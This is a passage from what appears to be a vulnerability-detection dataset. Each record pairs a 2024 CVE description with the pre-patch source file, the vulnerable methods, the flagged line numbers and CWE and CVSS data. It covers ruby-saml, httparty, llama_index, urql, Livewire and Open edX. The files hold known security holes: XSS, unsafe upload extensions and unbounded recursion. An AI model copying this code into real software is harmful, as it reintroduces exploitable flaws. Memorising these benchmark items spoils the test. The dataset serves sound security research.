          "content": "require 'cgi'\nrequire 'zlib'\nrequire 'base64'\nrequire 'nokogiri'\nrequire 'rexml/document'\nrequire 'rexml/xpath'\nrequire 'thread'\nrequire \"onelogin/ruby-saml/error_handling\"\n\n# Only supports SAML 2.0\nmodule OneLogin\n  module RubySaml\n\n    # SAML2 Message\n    #\n    class SamlMessage\n      include REXML\n\n      ASSERTION = \"urn:oasis:names:tc:SAML:2.0:assertion\"\n      PROTOCOL  = \"urn:oasis:names:tc:SAML:2.0:protocol\"\n\n      BASE64_FORMAT = %r(\\A([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?\\Z)\n      @@mutex = Mutex.new\n\n      MAX_BYTE_SIZE = 250000\n\n      # @return [Nokogiri::XML::Schema] Gets the schema object of the SAML 2.0 Protocol schema\n      #\n      def self.schema\n        @@mutex.synchronize do\n          Dir.chdir(File.expand_path(\"../../../schemas\", __FILE__)) do\n            ::Nokogiri::XML::Schema(File.read(\"saml-schema-protocol-2.0.xsd\"))\n          end\n        end\n      end\n\n      # @return [String|nil] Gets the Version attribute from the SAML Message if exists.\n      #\n      def version(document)\n        @version ||= begin\n          node = REXML::XPath.first(\n            document,\n            \"/p:AuthnRequest | /p:Response | /p:LogoutResponse | /p:LogoutRequest\",\n            { \"p\" => PROTOCOL }\n          )\n          node.nil? ? nil : node.attributes['Version']\n        end\n      end\n\n      # @return [String|nil] Gets the ID attribute from the SAML Message if exists.\n      #\n      def id(document)\n        @id ||= begin\n          node = REXML::XPath.first(\n            document,\n            \"/p:AuthnRequest | /p:Response | /p:LogoutResponse | /p:LogoutRequest\",\n            { \"p\" => PROTOCOL }\n          )\n          node.nil? ? nil : node.attributes['ID']\n        end\n      end\n\n      # Validates the SAML Message against the specified schema.\n      # @param document [REXML::Document] The message that will be validated\n      # @param soft [Boolean] soft Enable or Disable the soft mode (In order to raise exceptions when the message is invalid or not)\n      # @return [Boolean] True if the XML is valid, otherwise False, if soft=True\n      # @raise [ValidationError] if soft == false and validation fails\n      #\n      def valid_saml?(document, soft = true)\n        begin\n          xml = Nokogiri::XML(document.to_s) do |config|\n            config.options = XMLSecurity::BaseDocument::NOKOGIRI_OPTIONS\n          end\n        rescue Exception => error\n          return false if soft\n          raise ValidationError.new(\"XML load failed: #{error.message}\")\n        end\n\n        SamlMessage.schema.validate(xml).map do |schema_error|\n          return false if soft\n          raise ValidationError.new(\"#{schema_error.message}\\n\\n#{xml.to_s}\")\n        end\n      end\n\n      private\n\n      # Base64 decode and try also to inflate a SAML Message\n      # @param saml [String] The deflated and encoded SAML Message\n      # @return [String] The plain SAML Message\n      #\n      def decode_raw_saml(saml)\n        return saml unless base64_encoded?(saml)\n\n        if saml.bytesize > MAX_BYTE_SIZE\n          raise ValidationError.new(\"Encoded SAML Message exceeds \" + MAX_BYTE_SIZE.to_s + \" bytes, so was rejected\")\n        end\n\n        decoded = decode(saml)\n        begin\n          inflate(decoded)\n        rescue\n          decoded\n        end\n      end\n\n      # Deflate, base64 encode and url-encode a SAML Message (To be used in the HTTP-redirect binding)\n      # @param saml [String] The plain SAML Message\n      # @param settings [OneLogin::RubySaml::Settings|nil] Toolkit settings\n      # @return [String] The deflated and encoded SAML Message (encoded if the compression is requested)\n      #\n      def encode_raw_saml(saml, settings)\n        saml = deflate(saml) if settings.compress_request\n\n        CGI.escape(encode(saml))\n      end\n\n      # Base 64 decode method\n      # @param string [String] The string message\n      # @return [String] The decoded string\n      #\n      def decode(string)\n        Base64.decode64(string)\n      end\n\n      # Base 64 encode method\n      # @param string [String] The string\n      # @return [String] The encoded string\n      #\n      def encode(string)\n        if Base64.respond_to?('strict_encode64')\n          Base64.strict_encode64(string)\n        else\n          Base64.encode64(string).gsub(/\\n/, \"\")\n        end\n      end\n\n      # Check if a string is base64 encoded\n      # @param string [String] string to check the encoding of\n      # @return [true, false] whether or not the string is base64 encoded\n      #\n      def base64_encoded?(string)\n        !!string.gsub(/[\\r\\n]|\\\\r|\\\\n|\\s/, \"\").match(BASE64_FORMAT)\n      end\n\n      # Inflate method\n      # @param deflated [String] The string\n      # @return [String] The inflated string\n      #\n      def inflate(deflated)\n        Zlib::Inflate.new(-Zlib::MAX_WBITS).inflate(deflated)\n      end\n\n      # Deflate method\n      # @param inflated [String] The string\n      # @return [String] The deflated string\n      #\n      def deflate(inflated)\n        Zlib::Deflate.deflate(inflated, 9)[2..-5]\n      end\n    end\n  end\nend\n"
        }
      ],
      "method_level": [
        "def decode_raw_saml(saml)\n        return saml unless base64_encoded?(saml)\n\n        if saml.bytesize > MAX_BYTE_SIZE\n          raise ValidationError.new(\"Encoded SAML Message exceeds \" + MAX_BYTE_SIZE.to_s + \" bytes, so was rejected\")\n        end\n\n        decoded = decode(saml)\n        begin\n          inflate(decoded)\n        rescue\n          decoded\n        end\n      end"
      ],
      "hunk_level": [
        {
          "line_no": 100,
          "content": "          inflate(decoded)"
        },
        {
          "line_no": 102,
          "content": "          decoded"
        }
      ]
    },
    "cwe": [
      "CWE-400"
    ],
    "severity": "HIGH",
    "cvss_score": 7.7,
    "cvss_version": 4.0
  },
  {
    "id": 19,
    "cve": "CVE-2024-22049",
    "description": "httparty before 0.21.0 is vulnerable to an assumed-immutable web parameter vulnerability. A remote and unauthenticated attacker can provide a crafted filename parameter during multipart/form-data uploads which could result in attacker controlled filenames being written.",
    "vulnerability": {
      "file_level": [
        {
          "name": "lib/httparty/request/body.rb",
          "content": "# frozen_string_literal: true\n\nrequire_relative 'multipart_boundary'\n\nmodule HTTParty\n  class Request\n    class Body\n      NEWLINE = \"\\r\\n\"\n      private_constant :NEWLINE\n\n      def initialize(params, query_string_normalizer: nil, force_multipart: false)\n        @params = params\n        @query_string_normalizer = query_string_normalizer\n        @force_multipart = force_multipart\n      end\n\n      def call\n        if params.respond_to?(:to_hash)\n          multipart? ? generate_multipart : normalize_query(params)\n        else\n          params\n        end\n      end\n\n      def boundary\n        @boundary ||= MultipartBoundary.generate\n      end\n\n      def multipart?\n        params.respond_to?(:to_hash) && (force_multipart || has_file?(params))\n      end\n\n      private\n\n      def generate_multipart\n        normalized_params = params.flat_map { |key, value| HashConversions.normalize_keys(key, value) }\n\n        multipart = normalized_params.inject(''.dup) do |memo, (key, value)|\n          memo << \"--#{boundary}#{NEWLINE}\"\n          memo << %(Content-Disposition: form-data; name=\"#{key}\")\n          # value.path is used to support ActionDispatch::Http::UploadedFile\n          # https://github.com/jnunemaker/httparty/pull/585\n          memo << %(; filename=\"#{file_name(value)}\") if file?(value)\n          memo << NEWLINE\n          memo << \"Content-Type: #{content_type(value)}#{NEWLINE}\" if file?(value)\n          memo << NEWLINE\n          memo << content_body(value)\n          memo << NEWLINE\n        end\n\n        multipart << \"--#{boundary}--#{NEWLINE}\"\n      end\n\n      def has_file?(value)\n        if value.respond_to?(:to_hash)\n          value.to_hash.any? { |_, v| has_file?(v) }\n        elsif value.respond_to?(:to_ary)\n          value.to_ary.any? { |v| has_file?(v) }\n        else\n          file?(value)\n        end\n      end\n\n      def file?(object)\n        object.respond_to?(:path) && object.respond_to?(:read)\n      end\n\n      def normalize_query(query)\n        if query_string_normalizer\n          query_string_normalizer.call(query)\n        else\n          HashConversions.to_params(query)\n        end\n      end\n\n      def content_body(object)\n        if file?(object)\n          object = (file = object).read\n          file.rewind if file.respond_to?(:rewind)\n        end\n\n        object.to_s\n      end\n\n      def content_type(object)\n        return object.content_type if object.respond_to?(:content_type)\n        mime = MiniMime.lookup_by_filename(object.path)\n        mime ? mime.content_type : 'application/octet-stream'\n      end\n\n      def file_name(object)\n        object.respond_to?(:original_filename) ? object.original_filename : File.basename(object.path)\n      end\n\n      attr_reader :params, :query_string_normalizer, :force_multipart\n    end\n  end\nend\n"
        }
      ],
      "method_level": [
        "def generate_multipart\n        normalized_params = params.flat_map { |key, value| HashConversions.normalize_keys(key, value) }\n\n        multipart = normalized_params.inject(''.dup) do |memo, (key, value)|\n          memo << \"--#{boundary}#{NEWLINE}\"\n          memo << %(Content-Disposition: form-data; name=\"#{key}\")\n          # value.path is used to support ActionDispatch::Http::UploadedFile\n          # https://github.com/jnunemaker/httparty/pull/585\n          memo << %(; filename=\"#{file_name(value)}\") if file?(value)\n          memo << NEWLINE\n          memo << \"Content-Type: #{content_type(value)}#{NEWLINE}\" if file?(value)\n          memo << NEWLINE\n          memo << content_body(value)\n          memo << NEWLINE\n        end\n\n        multipart << \"--#{boundary}--#{NEWLINE}\"\n      end"
      ],
      "hunk_level": [
        {
          "line_no": 43,
          "content": "          memo << %(; filename=\"#{file_name(value)}\") if file?(value)"
        }
      ]
    },
    "cwe": [
      "CWE-472",
      "CWE-668"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.3,
    "cvss_version": 3.1
  },
  {
    "id": 1401,
    "cve": "CVE-2024-12910",
    "description": "A vulnerability in the `KnowledgeBaseWebReader` class of the run-llama/llama_index repository, version latest, allows an attacker to cause a Denial of Service (DoS) by controlling a URL variable to contain the root URL. This leads to infinite recursive calls to the `get_article_urls` method, exhausting system resources and potentially crashing the application.",
    "vulnerability": {
      "file_level": [
        {
          "name": "llama-index-integrations/readers/llama-index-readers-web/llama_index/readers/web/knowledge_base/base.py",
          "content": "from typing import Any, Dict, List, Optional\n\nfrom llama_index.core.readers.base import BaseReader\nfrom llama_index.core.schema import Document\n\n\nclass KnowledgeBaseWebReader(BaseReader):\n    \"\"\"Knowledge base reader.\n\n    Crawls and reads articles from a knowledge base/help center with Playwright.\n    Tested on Zendesk and Intercom CMS, may work on others.\n    Can be run in headless mode but it may be blocked by Cloudflare. Run it headed to be safe.\n    Times out occasionally, just increase the default time out if it does.\n    Requires the `playwright` package.\n\n    Args:\n        root_url (str): the base url of the knowledge base, with no trailing slash\n            e.g. 'https://support.intercom.com'\n        link_selectors (List[str]): list of css selectors to find links to articles while crawling\n            e.g. ['.article-list a', '.article-list a']\n        article_path (str): the url path of articles on this domain so the crawler knows when to stop\n            e.g. '/articles'\n        title_selector (Optional[str]): css selector to find the title of the article\n            e.g. '.article-title'\n        subtitle_selector (Optional[str]): css selector to find the subtitle/description of the article\n            e.g. '.article-subtitle'\n        body_selector (Optional[str]): css selector to find the body of the article\n            e.g. '.article-body'\n    \"\"\"\n\n    def __init__(\n        self,\n        root_url: str,\n        link_selectors: List[str],\n        article_path: str,\n        title_selector: Optional[str] = None,\n        subtitle_selector: Optional[str] = None,\n        body_selector: Optional[str] = None,\n    ) -> None:\n        \"\"\"Initialize with parameters.\"\"\"\n        self.root_url = root_url\n        self.link_selectors = link_selectors\n        self.article_path = article_path\n        self.title_selector = title_selector\n        self.subtitle_selector = subtitle_selector\n        self.body_selector = body_selector\n\n    def load_data(self) -> List[Document]:\n        \"\"\"Load data from the knowledge base.\"\"\"\n        from playwright.sync_api import sync_playwright\n\n        with sync_playwright() as p:\n            browser = p.chromium.launch(headless=False)\n\n            # Crawl\n            article_urls = self.get_article_urls(\n                browser,\n                self.root_url,\n                self.root_url,\n            )\n\n            # Scrape\n            documents = []\n            for url in article_urls:\n                article = self.scrape_article(\n                    browser,\n                    url,\n                )\n                extra_info = {\n                    \"title\": article[\"title\"],\n                    \"subtitle\": article[\"subtitle\"],\n                    \"url\": article[\"url\"],\n                }\n                documents.append(Document(text=article[\"body\"], extra_info=extra_info))\n\n            browser.close()\n\n            return documents\n\n    def scrape_article(\n        self,\n        browser: Any,\n        url: str,\n    ) -> Dict[str, str]:\n        \"\"\"Scrape a single article url.\n\n        Args:\n            browser (Any): a Playwright Chromium browser.\n            url (str): URL of the article to scrape.\n\n        Returns:\n            Dict[str, str]: a mapping of article attributes to their values.\n\n        \"\"\"\n        page = browser.new_page(ignore_https_errors=True)\n        page.set_default_timeout(60000)\n        page.goto(url, wait_until=\"domcontentloaded\")\n\n        title = (\n            (\n                page.query_selector(self.title_selector).evaluate(\n                    \"node => node.innerText\"\n                )\n            )\n            if self.title_selector\n            else \"\"\n        )\n        subtitle = (\n            (\n                page.query_selector(self.subtitle_selector).evaluate(\n                    \"node => node.innerText\"\n                )\n            )\n            if self.subtitle_selector\n            else \"\"\n        )\n        body = (\n            (page.query_selector(self.body_selector).evaluate(\"node => node.innerText\"))\n            if self.body_selector\n            else \"\"\n        )\n\n        page.close()\n        print(\"scraped:\", url)\n        return {\"title\": title, \"subtitle\": subtitle, \"body\": body, \"url\": url}\n\n    def get_article_urls(\n        self, browser: Any, root_url: str, current_url: str\n    ) -> List[str]:\n        \"\"\"Recursively crawl through the knowledge base to find a list of articles.\n\n        Args:\n            browser (Any): a Playwright Chromium browser.\n            root_url (str): root URL of the knowledge base.\n            current_url (str): current URL that is being crawled.\n\n        Returns:\n            List[str]: a list of URLs of found articles.\n\n        \"\"\"\n        page = browser.new_page(ignore_https_errors=True)\n        page.set_default_timeout(60000)\n        page.goto(current_url, wait_until=\"domcontentloaded\")\n\n        # If this is a leaf node aka article page, return itself\n        if self.article_path in current_url:\n            print(\"Found an article: \", current_url)\n            page.close()\n            return [current_url]\n\n        # Otherwise crawl this page and find all the articles linked from it\n        article_urls = []\n        links = []\n\n        for link_selector in self.link_selectors:\n            ahrefs = page.query_selector_all(link_selector)\n            links.extend(ahrefs)\n\n        for link in links:\n            url = root_url + page.evaluate(\"(node) => node.getAttribute('href')\", link)\n            article_urls.extend(self.get_article_urls(browser, root_url, url))\n\n        page.close()\n\n        return article_urls\n"
        }
      ],
      "method_level": [
        "def load_data(self) -> List[Document]:\n        \"\"\"Load data from the knowledge base.\"\"\"\n        from playwright.sync_api import sync_playwright\n\n        with sync_playwright() as p:\n            browser = p.chromium.launch(headless=False)\n\n            # Crawl\n            article_urls = self.get_article_urls(\n                browser,\n                self.root_url,\n                self.root_url,\n            )\n\n            # Scrape\n            documents = []\n            for url in article_urls:\n                article = self.scrape_article(\n                    browser,\n                    url,\n                )\n                extra_info = {\n                    \"title\": article[\"title\"],\n                    \"subtitle\": article[\"subtitle\"],\n                    \"url\": article[\"url\"],\n                }\n                documents.append(Document(text=article[\"body\"], extra_info=extra_info))\n\n            browser.close()\n\n            return documents",
        "def scrape_article(\n        self,\n        browser: Any,\n        url: str,\n    ) -> Dict[str, str]:\n        \"\"\"Scrape a single article url.\n\n        Args:\n            browser (Any): a Playwright Chromium browser.\n            url (str): URL of the article to scrape.\n\n        Returns:\n            Dict[str, str]: a mapping of article attributes to their values.\n\n        \"\"\"\n        page = browser.new_page(ignore_https_errors=True)\n        page.set_default_timeout(60000)\n        page.goto(url, wait_until=\"domcontentloaded\")\n\n        title = (\n            (\n                page.query_selector(self.title_selector).evaluate(\n                    \"node => node.innerText\"\n                )\n            )\n            if self.title_selector\n            else \"\"\n        )\n        subtitle = (\n            (\n                page.query_selector(self.subtitle_selector).evaluate(\n                    \"node => node.innerText\"\n                )\n            )\n            if self.subtitle_selector\n            else \"\"\n        )\n        body = (\n            (page.query_selector(self.body_selector).evaluate(\"node => node.innerText\"))\n            if self.body_selector\n            else \"\"\n        )\n\n        page.close()\n        print(\"scraped:\", url)\n        return {\"title\": title, \"subtitle\": subtitle, \"body\": body, \"url\": url}",
        "def get_article_urls(\n        self, browser: Any, root_url: str, current_url: str\n    ) -> List[str]:\n        \"\"\"Recursively crawl through the knowledge base to find a list of articles.\n\n        Args:\n            browser (Any): a Playwright Chromium browser.\n            root_url (str): root URL of the knowledge base.\n            current_url (str): current URL that is being crawled.\n\n        Returns:\n            List[str]: a list of URLs of found articles.\n\n        \"\"\"\n        page = browser.new_page(ignore_https_errors=True)\n        page.set_default_timeout(60000)\n        page.goto(current_url, wait_until=\"domcontentloaded\")\n\n        # If this is a leaf node aka article page, return itself\n        if self.article_path in current_url:\n            print(\"Found an article: \", current_url)\n            page.close()\n            return [current_url]\n\n        # Otherwise crawl this page and find all the articles linked from it\n        article_urls = []\n        links = []\n\n        for link_selector in self.link_selectors:\n            ahrefs = page.query_selector_all(link_selector)\n            links.extend(ahrefs)\n\n        for link in links:\n            url = root_url + page.evaluate(\"(node) => node.getAttribute('href')\", link)\n            article_urls.extend(self.get_article_urls(browser, root_url, url))\n\n        page.close()\n\n        return article_urls"
      ],
      "hunk_level": [
        {
          "line_no": 57,
          "content": "                browser,"
        },
        {
          "line_no": 58,
          "content": "                self.root_url,"
        },
        {
          "line_no": 59,
          "content": "                self.root_url,"
        },
        {
          "line_no": 85,
          "content": "        \"\"\"Scrape a single article url."
        },
        {
          "line_no": 128,
          "content": "        self, browser: Any, root_url: str, current_url: str"
        },
        {
          "line_no": 130,
          "content": "        \"\"\"Recursively crawl through the knowledge base to find a list of articles."
        },
        {
          "line_no": 161,
          "content": "            article_urls.extend(self.get_article_urls(browser, root_url, url))"
        }
      ]
    },
    "cwe": [
      "CWE-400"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.9,
    "cvss_version": 3.1
  },
  {
    "id": 184,
    "cve": "CVE-2024-24556",
    "description": "urql is a GraphQL client that exposes a set of helpers for several frameworks.  The `@urql/next` package is vulnerable to XSS. To exploit this an attacker would need to ensure that the response returns `html` tags and that the web-application is using streamed responses (non-RSC). This vulnerability is due to improper escaping of html-like characters in the response-stream. To fix this vulnerability upgrade to version 1.1.1",
    "vulnerability": {
      "file_level": [
        {
          "name": "packages/next-urql/src/DataHydrationContext.ts",
          "content": "import * as React from 'react';\nimport { ServerInsertedHTMLContext } from 'next/navigation';\nimport type { UrqlResult } from './useUrqlValue';\n\ninterface DataHydrationValue {\n  isInjecting: boolean;\n  operationValuesByKey: Record<number, UrqlResult>;\n  RehydrateScript: () =>\n    | React.DetailedReactHTMLElement<\n        { dangerouslySetInnerHTML: { __html: string } },\n        HTMLElement\n      >\n    | React.FunctionComponentElement<any>;\n}\n\nconst DataHydrationContext = React.createContext<\n  DataHydrationValue | undefined\n>(undefined);\n\nfunction transportDataToJS(data: any) {\n  const key = 'urql_transport';\n  return `(window[Symbol.for(\"${key}\")] ??= []).push(${JSON.stringify(data)})`;\n}\n\nexport const DataHydrationContextProvider = ({\n  nonce,\n  children,\n}: React.PropsWithChildren<{ nonce?: string }>) => {\n  const dataHydrationContext = React.useRef<DataHydrationValue>();\n  if (typeof window == 'undefined') {\n    if (!dataHydrationContext.current)\n      dataHydrationContext.current = buildContext({ nonce });\n  }\n\n  return React.createElement(\n    DataHydrationContext.Provider,\n    { value: dataHydrationContext.current },\n    children\n  );\n};\n\nexport function useDataHydrationContext(): DataHydrationValue | undefined {\n  const dataHydrationContext = React.useContext(DataHydrationContext);\n  const insertHtml = React.useContext(ServerInsertedHTMLContext);\n\n  if (typeof window !== 'undefined') return;\n\n  if (insertHtml && dataHydrationContext && !dataHydrationContext.isInjecting) {\n    dataHydrationContext.isInjecting = true;\n    insertHtml(() =>\n      React.createElement(dataHydrationContext.RehydrateScript, {})\n    );\n  }\n  return dataHydrationContext;\n}\n\nlet key = 0;\nfunction buildContext({ nonce }: { nonce?: string }): DataHydrationValue {\n  const dataHydrationContext: DataHydrationValue = {\n    isInjecting: false,\n    operationValuesByKey: {},\n    RehydrateScript() {\n      dataHydrationContext.isInjecting = false;\n      if (!Object.keys(dataHydrationContext.operationValuesByKey).length)\n        return React.createElement(React.Fragment);\n\n      const __html = transportDataToJS({\n        rehydrate: { ...dataHydrationContext.operationValuesByKey },\n      });\n\n      dataHydrationContext.operationValuesByKey = {};\n\n      return React.createElement('script', {\n        key: key++,\n        nonce: nonce,\n        dangerouslySetInnerHTML: { __html },\n      });\n    },\n  };\n\n  return dataHydrationContext;\n}\n"
        }
      ],
      "method_level": [
        "transportDataToJS"
      ],
      "hunk_level": [
        {
          "line_no": 22,
          "content": "  return `(window[Symbol.for(\"${key}\")] ??= []).push(${JSON.stringify(data)})`;"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "HIGH",
    "cvss_score": 7.2,
    "cvss_version": 3.1
  },
  {
    "id": 1224,
    "cve": "CVE-2024-47823",
    "description": "Livewire is a full-stack framework for Laravel that allows for dynamic UI components without leaving PHP. In livewire/livewire prior to `2.12.7` and `v3.5.2`, the file extension of an uploaded file is guessed based on the MIME type. As a result, the actual file extension from the file name is not validated. An attacker can therefore bypass the validation by uploading a file with a valid MIME type (e.g., `image/png`) and a “.php” file extension. If the following criteria are met, the attacker can carry out an RCE attack: 1. Filename is composed of the original file name using `$file->getClientOriginalName()`. 2. Files stored directly on your server in a public storage disk. 3. Webserver is configured to execute “.php” files. This issue has been addressed in release versions `2.12.7` and `3.5.2`. All users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/TemporaryUploadedFile.php",
          "content": "<?php\n\nnamespace Livewire;\n\nuse Illuminate\\Support\\Arr;\nuse Illuminate\\Http\\UploadedFile;\nuse Illuminate\\Support\\Facades\\URL;\nuse Illuminate\\Support\\Facades\\Storage;\nuse League\\MimeTypeDetection\\FinfoMimeTypeDetector;\n\n#[\\AllowDynamicProperties]\nclass TemporaryUploadedFile extends UploadedFile\n{\n    protected $storage;\n    protected $path;\n\n    public function __construct($path, $disk)\n    {\n        $this->disk = $disk;\n        $this->storage = Storage::disk($this->disk);\n        $this->path = FileUploadConfiguration::path($path, false);\n\n        $tmpFile = tmpfile();\n\n        parent::__construct(stream_get_meta_data($tmpFile)['uri'], $this->path);\n    }\n\n    public function getPath(): string\n    {\n        return $this->storage->path(FileUploadConfiguration::directory());\n    }\n\n    public function isValid(): bool\n    {\n        return true;\n    }\n\n    public function getSize(): int\n    {\n        if (app()->runningUnitTests() && str($this->getfilename())->contains('-size=')) {\n            return (int) str($this->getFilename())->between('-size=', '.')->__toString();\n        }\n\n        return (int) $this->storage->size($this->path);\n    }\n\n    public function getMimeType(): string\n    {\n        $mimeType = $this->storage->mimeType($this->path);\n\n        // Flysystem V2.0+ removed guess mimeType from extension support, so it has been re-added back\n        // in here to ensure the correct mimeType is returned when using faked files in tests\n        if (in_array($mimeType, ['application/octet-stream', 'inode/x-empty', 'application/x-empty'])) {\n            $detector = new FinfoMimeTypeDetector();\n\n            $mimeType = $detector->detectMimeTypeFromPath($this->path) ?: 'text/plain';\n        }\n\n        return $mimeType;\n    }\n\n    public function getFilename(): string\n    {\n        return $this->getName($this->path);\n    }\n\n    public function getRealPath(): string\n    {\n        return $this->storage->path($this->path);\n    }\n\n    public function getClientOriginalName(): string\n    {\n        return $this->extractOriginalNameFromFilePath($this->path);\n    }\n\n    public function dimensions()\n    {\n        stream_copy_to_stream($this->storage->readStream($this->path), $tmpFile = tmpfile());\n\n        return @getimagesize(stream_get_meta_data($tmpFile)['uri']);;\n    }\n\n    public function temporaryUrl()\n    {\n        if ((FileUploadConfiguration::isUsingS3() or FileUploadConfiguration::isUsingGCS()) && ! app()->runningUnitTests()) {\n            return $this->storage->temporaryUrl(\n                $this->path,\n                now()->addDay(),\n                ['ResponseContentDisposition' => 'filename=\"' . $this->getClientOriginalName() . '\"']\n            );\n        }\n\n        if (method_exists($this->storage->getAdapter(), 'getTemporaryUrl') || ! $this->isPreviewable()) {\n            // This will throw an error because it's not used with S3.\n            return $this->storage->temporaryUrl($this->path, now()->addDay());\n        }\n\n        return URL::temporarySignedRoute(\n            'livewire.preview-file', now()->addMinutes(30), ['filename' => $this->getFilename()]\n        );\n    }\n\n    public function isPreviewable()\n    {\n        $supportedPreviewTypes = config('livewire.temporary_file_upload.preview_mimes', [\n            'png', 'gif', 'bmp', 'svg', 'wav', 'mp4',\n            'mov', 'avi', 'wmv', 'mp3', 'm4a',\n            'jpg', 'jpeg', 'mpga', 'webp', 'wma',\n        ]);\n\n        return in_array($this->guessExtension(),  $supportedPreviewTypes);\n    }\n\n    public function readStream()\n    {\n        return $this->storage->readStream($this->path);\n    }\n\n    public function exists()\n    {\n        return $this->storage->exists($this->path);\n    }\n\n    public function get()\n    {\n        return $this->storage->get($this->path);\n    }\n\n    public function delete()\n    {\n        return $this->storage->delete($this->path);\n    }\n\n    public function storeAs($path, $name = null, $options = [])\n    {\n        $options = $this->parseOptions($options);\n\n        $disk = Arr::pull($options, 'disk') ?: $this->disk;\n\n        $newPath = trim($path.'/'.$name, '/');\n\n        Storage::disk($disk)->put(\n            $newPath, $this->storage->readStream($this->path), $options\n        );\n\n        return $newPath;\n    }\n\n    public static function generateHashNameWithOriginalNameEmbedded($file)\n    {\n        $hash = str()->random(30);\n        $meta = str('-meta'.base64_encode($file->getClientOriginalName()).'-')->replace('/', '_');\n        $extension = '.'.$file->guessExtension();\n\n        return $hash.$meta.$extension;\n    }\n\n    public function extractOriginalNameFromFilePath($path)\n    {\n        return base64_decode(head(explode('-', last(explode('-meta', str($path)->replace('_', '/'))))));\n    }\n\n    public static function createFromLivewire($filePath)\n    {\n        return new static($filePath, FileUploadConfiguration::disk());\n    }\n\n    public static function canUnserialize($subject)\n    {\n        if (is_string($subject)) {\n            return (string) str($subject)->startsWith(['livewire-file:', 'livewire-files:']);\n        }\n\n        if (is_array($subject)) {\n            return collect($subject)->contains(function ($value) {\n                return static::canUnserialize($value);\n            });\n        }\n\n        return false;\n    }\n\n    public static function unserializeFromLivewireRequest($subject)\n    {\n        if (is_string($subject)) {\n            if (str($subject)->startsWith('livewire-file:')) {\n                return static::createFromLivewire(str($subject)->after('livewire-file:'));\n            }\n\n            if (str($subject)->startsWith('livewire-files:')) {\n                $paths = json_decode(str($subject)->after('livewire-files:'), true);\n\n                return collect($paths)->map(function ($path) { return static::createFromLivewire($path); })->toArray();\n            }\n        }\n\n        if (is_array($subject)) {\n            foreach ($subject as $key => $value) {\n                $subject[$key] =  static::unserializeFromLivewireRequest($value);\n            }\n        }\n\n        return $subject;\n    }\n\n    public function serializeForLivewireResponse()\n    {\n        return 'livewire-file:'.$this->getFilename();\n    }\n\n    public static function serializeMultipleForLivewireResponse($files)\n    {\n        return 'livewire-files:'.json_encode(collect($files)->map->getFilename());\n    }\n}\n"
        }
      ],
      "method_level": [
        "public static function generateHashNameWithOriginalNameEmbedded($file)\n    {\n        $hash = str()->random(30);\n        $meta = str('-meta'.base64_encode($file->getClientOriginalName()).'-')->replace('/', '_');\n        $extension = '.'.$file->guessExtension();\n\n        return $hash.$meta.$extension;\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 154,
          "content": "        $extension = '.'.$file->guessExtension();"
        }
      ]
    },
    "cwe": [
      "CWE-20",
      "CWE-434"
    ],
    "severity": "HIGH",
    "cvss_score": 7.7,
    "cvss_version": 4.0
  },
  {
    "id": 1113,
    "cve": "CVE-2024-43782",
    "description": "This openedx-translations repository contains translation files from Open edX repositories to be kept in sync with Transifex. Before moving to pulling translations from the openedx-translations repository via openedx-atlas, translations in the edx-platform repository were validated using edx-i18n-tools. This validation included protection against malformed translations and translations-based script injections. Prior to this patch, the validation implemented in the openedx-translations repository did not include the same protections. The maintainer inspected the translations in the edx-platform directory of both the main and open-release/redwood.master branches of the openedx-translations repository and found no evidence of exploited translation strings.",
    "vulnerability": {
      "file_level": [
        {
          "name": "scripts/validate_translation_files.py",
          "content": "\"\"\"\nValidate translation files using GNU gettext `msgfmt` command.\n\"\"\"\n\nimport argparse\nimport os\nimport os.path\nimport subprocess\nimport sys\n\n\ndef get_translation_files(translation_directory):\n    \"\"\"\n    List all translations '*.po' files in the specified directory.\n    \"\"\"\n    po_files = []\n    for root, _dirs, files in os.walk(translation_directory):\n        for file_name in files:\n            pofile_path = os.path.join(root, file_name)\n            if file_name.endswith('.po') and '/en/LC_MESSAGES/' not in pofile_path:\n                po_files.append(pofile_path)\n    return po_files\n\n\ndef validate_translation_file(po_file):\n    \"\"\"\n    Validate a translation file and return errors if any.\n\n    This function combines both stderr and stdout output of the `msgfmt` in a\n    single variable.\n    \"\"\"\n    completed_process = subprocess.run(\n        ['msgfmt', '-v', '--strict', '--check', po_file],\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n    )\n\n    stdout = completed_process.stdout.decode(encoding='utf-8', errors='replace')\n    stderr = completed_process.stderr.decode(encoding='utf-8', errors='replace')\n\n    return {\n        'valid': completed_process.returncode == 0,\n        'output': f'{stdout}\\n{stderr}',\n    }\n\n\ndef validate_translation_files(\n    translations_dir='translations',\n):\n    \"\"\"\n    Run GNU gettext `msgfmt` and print errors to stderr.\n\n    Returns integer OS Exit code:\n\n      return 0 for valid translation.\n      return 1 for invalid translations.\n    \"\"\"\n    translations_valid = True\n\n    invalid_lines = []\n\n    po_files = get_translation_files(translations_dir)\n    for po_file in po_files:\n        result = validate_translation_file(po_file)\n\n        if result['valid']:\n            print('VALID: ' + po_file)\n            print(result['output'], '\\n' * 2)\n        else:\n            invalid_lines.append('INVALID: ' + po_file)\n            invalid_lines.append(result['output'] + '\\n' * 2)\n            translations_valid = False\n\n    # Print validation errors in the bottom for easy reading\n    print('\\n'.join(invalid_lines), file=sys.stderr)\n\n    if translations_valid:\n        print('-----------------------------------------')\n        print('SUCCESS: All translation files are valid.')\n        print('-----------------------------------------')\n        exit_code = 0\n    else:\n        print('---------------------------------------', file=sys.stderr)\n        print('FAILURE: Some translations are invalid.', file=sys.stderr)\n        print('---------------------------------------', file=sys.stderr)\n        exit_code = 1\n\n    return exit_code\n\n\ndef main():  # pragma: no cover\n    parser = argparse.ArgumentParser(description=__doc__)\n    parser.add_argument('--dir', action='store', type=str, default='translations')\n    args = parser.parse_args()\n    sys.exit(validate_translation_files(\n        translations_dir=args.dir,\n    ))\n\n\nif __name__ == '__main__':\n    main()  # pragma: no cover\n"
        }
      ],
      "method_level": [
